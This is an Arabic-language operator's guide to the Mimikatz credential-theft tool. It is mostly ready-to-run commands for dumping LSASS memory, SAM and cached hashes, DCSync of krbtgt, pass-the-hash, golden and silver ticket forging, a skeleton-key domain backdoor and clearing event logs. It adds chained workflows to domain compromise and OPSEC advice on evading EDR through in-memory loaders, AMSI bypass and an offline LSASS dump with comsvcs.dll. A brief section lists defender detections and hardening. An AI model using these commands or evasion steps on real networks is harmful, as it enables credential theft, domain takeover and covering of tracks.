# دليل Mimikatz الشامل

تُعد Mimikatz الأداة الأبرز لاستخراج بيانات الاعتماد (Credentials) في بيئات Windows. بدأت كنموذج بحثي من تطوير Benjamin Delpy، وتطورت لتشمل تقريبًا كافة تقنيات الهجوم على Kerberos و LSASS و DPAPI و CryptoAPI. تكتشف أنظمة EDR هذه الأداة فور ظهورها؛ لذا يعتمد المحترفون على نسخ معدلة (Forks) أو محملات في الذاكرة (In-memory loaders) أو استدعاء نفس واجهات البرمجة (APIs) باستخدام لغات مثل C# أو Rust.

## التثبيت (Install)

```terminal
# أحدث النسخ الثنائية:
https://github.com/gentilkiwi/mimikatz/releases
```

يوجد ملف `mimikatz.exe` لنسختي (32/64-bit). يجب التشغيل من واجهة أوامر (cmd / PowerShell) بصلاحيات مرتفعة (Elevated).

## النموذج الذهني للوحدات (Modules)

تستخدم Mimikatz صيغة `module::command [args]`. إليك أهم الوحدات:

| الوحدة (Module) | الوظيفة |
|-----------------|---------|
| `privilege` | رفع صلاحيات الأداة (مثل `debug` و `driver`) |
| `token` | التلاعب بالرموز التعريفية (Token impersonation) |
| `sekurlsa` | فحص ذاكرة LSASS - كلمات المرور، هاشات NT، وتذاكر Kerberos |
| `lsadump` | استخراج أسرار LSA، وقاعدة بيانات SAM، و DCSync |
| `kerberos` | هجمات Pass-the-ticket و Golden/Silver tickets |
| `crypto` | استخراج الشهادات المحلية ومخازن CryptoAPI |
| `dpapi` | استخراج مفاتيح وكتل DPAPI |
| `vault` | استخراج بيانات Windows Credential Vault |
| `process` | إدارة العمليات (قائمة، إنهاء، حقن) |
| `service` | التحكم في الخدمات |
| `event` | مسح سجلات الأحداث (Event logs) |
| `misc` | مهام متنوعة (Skeleton key, memssp, addsid) |

## المتطلبات الأساسية

ابدأ دائمًا بالأمر التالي:

```terminal
privilege::debug
```

إذا فشل الأمر (`ERROR kuhl_m_privilege_simple`)، فهذا يعني أنك لا تملك صلاحيات Local Admin أو SYSTEM. قد يساعد أمر `token::elevate` إذا كنت تملك صلاحية SeImpersonate.

## الأوامر الأكثر استخدامًا

### sekurlsa::logonpasswords

الأمر الأكثر شهرة. يقوم باستخراج كافة البيانات التي يحتفظ بها LSASS لكل جلسة تفاعلية.

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

النتائج المتوقعة: NT hash، وفي الأنظمة القديمة (بدون Credential Guard) قد تظهر كلمات المرور بنص صريح، بالإضافة إلى تذاكر Kerberos و MSV credentials.

### sekurlsa::tickets

```
sekurlsa::tickets /export
```

يستخرج كافة تذاكر Kerberos من الذاكرة إلى ملفات بصيغة `*.kirbi` في الدليل الحالي، وهي مادة دسمة لهجمات Pass-the-ticket.

### sekurlsa::pth — Pass-the-Hash

```
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:5e5a04...
```

يقوم بإنشاء عملية `cmd.exe` جديدة ببيانات Kerberos / NTLM مطابقة للهاش المقدم، مما يتيح لك التصرف كأنك ذلك المستخدم.

### lsadump::sam — Local SAM

```
lsadump::sam
```

يستخرج هاش NT للمسؤول المحلي (Local Administrator). يعادل تشغيل `secretsdump -sam`.

### lsadump::lsa /patch — Cached Domain Creds

```
lsadump::lsa /patch
```

يستخرج هاشات NT المخزنة مؤقتًا (Cached) لكل حساب قام بتسجيل الدخول.

### lsadump::dcsync — Replication-based Dump

```
lsadump::dcsync /domain:corp.local /user:krbtgt
lsadump::dcsync /all /csv
```

يتطلب صلاحيات `Replicate Directory Changes` (ما يعادل صلاحيات Domain Admin). يقوم بسحب الهاشات عبر بروتوكول DRSUAPI تمامًا كما يفعل موزع النطاق (DC).

### kerberos::golden / silver

```
# Golden Ticket — استخدام هاش krbtgt لاختراق النطاق بالكامل وللأبد
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... \
                 /krbtgt:<NT-hash> /ptt

# Silver Ticket — تذكرة خدمة واحدة باستخدام هاش حساب الخدمة
kerberos::golden /user:alice /domain:corp.local /sid:S-1-5-21-... \
                 /target:fileserver /service:cifs /rc4:<svc-NT> /ptt
```

خيار `/ptt` يقوم بحقن التذكرة الناتجة مباشرة في جلسة تسجيل الدخول الحالية.

### misc::skeletonkey — Domain Backdoor

```
misc::skeletonkey /domain:corp.local
```

يقوم بتعديل LSASS على موزع النطاق (DC) بحيث يمكن لأي مستخدم في النطاق المصادقة باستخدام كلمة المرور الرئيسية "mimikatz" (مع بقاء كلمات مرورهم الأصلية فعالة). يستمر هذا التعديل حتى إعادة تشغيل الDC. **تحذير:** هذا الإجراء يصدر ضجيجًا عاليًا جدًا في الشبكة، ويُستخدم فقط في المختبرات أو الأبحاث.

### crypto::capi / dpapi modules

تُستخدم لفك تشفير ملفات تعريف الارتباط (Cookies) في المتصفحات، وبيانات RDP المخزنة، وملفات Wi-Fi، وغيرها. تُستخدم عادةً مع `mimikatz dpapi::masterkey /system:SYSTEM /security:SECURITY /sid:<sid>`.

### event::clear — مسح السجلات

```
event::clear /eventlog:Security
```

سهل الاكتشاف؛ حيث إن مسح السجلات يولد حدثًا برقم EID 1102، مما يجعله إجراءً "صاخبًا".

## مسارات العمل (Workflows)

### Local Admin → استخراج كافة الاعتمادات من الذاكرة

```
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets /export
```

### Local Admin → SAM + هاشات النطاق المخزنة

```
privilege::debug
lsadump::sam
lsadump::lsa /patch
```

### من مستخدم عادي → DCSync krbtgt → Golden Ticket

(يتطلب صلاحيات DA أو تفويضات محددة لـ DCSync)

```
lsadump::dcsync /domain:corp.local /user:krbtgt
kerberos::golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-...
                 /krbtgt:<krbtgt-NT> /ticket:fakeadmin.kirbi
kerberos::ptt fakeadmin.kirbi
```

### بصلاحيات SYSTEM على الـ DC — الوصول المباشر لـ LSASS

```
privilege::debug
token::elevate
lsadump::lsa /patch /name:krbtgt
```

## مثال لمخرجات ناجحة

```
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 1234567 (00000000:00012d687)
Session           : Interactive from 1
User Name         : alice
Domain            : CORP
Logon Server      : DC01
Logon Time        : 4/29/2026 9:01:23 AM
SID               : S-1-5-21-...

        msv :
         [00000003] Primary
         * Username : alice
         * Domain   : CORP
         * NTLM     : 5e5a04...
         * SHA1     : 3b4c5d...
        tspkg :
        wdigest :
         * Username : alice
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : alice
         * Domain   : CORP.LOCAL
         * Password : (null)
        ssp :
        credman :
```

ظهور `Password : (null)` أمر طبيعي في أنظمة Windows الحديثة حيث يتم تعطيل wdigest افتراضيًا منذ عام 2014. الهدف الأساسي هنا هو الحصول على هاش NT.

## المشاكل الشائعة والحلول

| العرض | السبب | الحل |
|-------|-------|------|
| `ERROR privilege::debug : 0x00000522` | نقص في الصلاحيات | التشغيل بصلاحيات مسؤول (Elevated) |
| `ERROR sekurlsa::logonpasswords` | تفعيل Credential Guard / VBS | لا يمكن الاستخراج من LSASS مباشرة - انتقل لتقنيات أخرى (تفريغ الذاكرة أوفلاين) |
| `ERROR lsadump::dcsync : 0x00002105` | لا توجد صلاحيات Replication | تحتاج لصلاحيات DA أو تعديل الـ ACL |
| حظر الملف على القرص | اكتشاف توقيع الأداة من الـ EDR | استخدم محملات الذاكرة (Invoke-Mimikatz)؛ لا تضع `mimikatz.exe` على القرص أبدًا |
| فشل حقن تذكرة Kerberos | فرق التوقيت (Time skew) > 5 دقائق | استخدم `w32tm /resync` أو زامن الوقت يدويًا |

## منظور المدافعين (Defender's Perspective)

تعتبر Mimikatz من أكثر الأدوات المرصودة عالميًا:

- برامج الحماية (AV) تكتشف الملف الثنائي، وأوامر مثل `privilege::debug` ومخرجات الأداة.
- نظام Sysmon EID 10 يرصد محاولات الوصول لعملية `lsass.exe` من عمليات غير موثوقة - **هذا هو أقوى أسلوب اكتشاف**.
- رصد أنماط أحداث 4662 / 4624 / 4663 الخاصة بـ dcsync.
- رصد نسخ PowerShell عبر ETW / AMSI في الأنظمة الحديثة.

أفكار للحماية:
- حظر أي عملية (باستثناء الموثقة) من فتح LSASS بصلاحيات `PROCESS_VM_READ`.
- تفعيل قواعد Microsoft Defender (ASR): **Block credential stealing from lsass.exe**.
- تفعيل LSA Protected Process Light (RunAsPPL).
- تفعيل Credential Guard لعزل البيانات الحساسة في عملية معزولة عبر VBS.

## أمن العمليات (OPSEC)

- الملف الثنائي مكتشف من كافة برامج الحماية. **لا تضع** `mimikatz.exe` على القرص في المهمات الحقيقية.
- استخدم بدائل مثل: `Invoke-Mimikatz` (PowerShell مع تخطي AMSI)، أو Cobalt Strike `mimikatz` BOF، أو SafetyKatz.
- الأسلوب الأفضل (Offline): قم بتفريغ ذاكرة LSASS باستخدام `comsvcs.dll MiniDump` كملف `.dmp` ثم انقله واستخدم pypykatz/mimikatz عليه محليًا.

```terminal
# تفريغ LSASS أوفلاين
rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump <lsass-pid> C:\temp\lsass.dmp full
# ثم على جهاز المهاجم:
pypykatz lsa minidump lsass.dmp
```

## أدوات ذات صلة

| الأداة | التخصص |
|--------|---------|
| **pypykatz** | مكتوبة بلغة Python، لتحليل ملفات الميميدمب، تعمل على مختلف الأنظمة |
| **SafetyKatz** | نسخة مطورة بلغة C#، أكثر قدرة على تخطي EDR |
| **lsassy** | سحب LSASS عن بعد وتحليله من نظام Linux |
| **Rubeus** | مجموعة أدوات متكاملة لهجمات Kerberos بلغة C# |
| **gentilkiwi/kekeo** | مشروع شقيق لـ Mimikatz متخصص في تفويضات Kerberos |
| **Invoke-Mimikatz** | محمل عاكس (Reflective loader) بلغة PowerShell |
| **donut + Mimikatz** | تحويل Mimikatz إلى Shellcode للتشغيل في الذاكرة |
